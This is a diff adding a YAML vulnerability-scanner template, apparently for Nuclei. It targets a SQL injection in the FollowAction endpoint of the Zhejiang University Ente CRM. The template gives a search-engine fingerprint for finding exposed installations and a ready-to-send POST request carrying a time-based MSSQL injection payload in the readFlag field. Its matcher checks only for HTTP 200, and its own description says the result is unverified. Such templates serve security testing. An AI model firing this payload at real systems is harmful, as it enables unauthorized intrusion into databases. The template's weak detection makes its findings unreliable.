@@ -1,0 +1,38 @@
+id: poc-dd0a48b236741399d8a0
+info:
+  name: 浙大恩特CRMFollowAction存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dd0a48b236741399d8a0b7e502598eea
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: dd0a48b236741399d8a0b7e502598eea
+    fofa: + hunter`app.name="浙大恩特 CRM"`
+http:
+- raw:
+  - 'POST /entsoft/FollowAction.entphone;.js HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+
+    Connection: close
+
+    Content-Length: 72
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+
+    method=updreadFlg&trk_id=a&readFlag=a%27;WAITFOR%20DELAY%20%270:0:3%27--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
